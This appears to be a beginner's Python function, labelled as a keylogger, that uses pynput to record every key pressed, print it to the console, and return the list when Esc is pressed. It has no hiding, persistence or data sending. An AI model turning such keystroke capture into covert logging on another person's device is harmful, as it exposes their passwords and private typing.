from pynput.keyboard import Key, Listener


# Keylogger Func
def keylogger():
    keylog = []
    keylogclass = []
    stop_listening = False 

    
    def on_press(key):
        nonlocal stop_listening

        try:
            if key.char.isdigit():
                keylog.append(int(key.char))
                keylogclass.append(int(key.char))
            else:
                keylog.append(key.char)
                keylogclass.append(key.char)
            print('Key {} pressed.'.format(key.char))
        except AttributeError:
            keylog.append(str(key))
            keylogclass.append(str(key))
            print('Key {} pressed.'.format(key))
        # Stops listener, trying to implement different element. 
        if key == Key.esc:
            stop_listening = True 

    
    def on_release(key): 
        pass

    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_listening: 
            pass
        listener.stop()

    
    for x in keylog: 
        keylogclass.append(type(x))

    print("KeyLog recorded under keylog[] ", len(keylog), "total keys pressed. ")
    print("KeyLog type recorded under keylog_class[]")
    print("End. ")

    return keylog
    
    
   


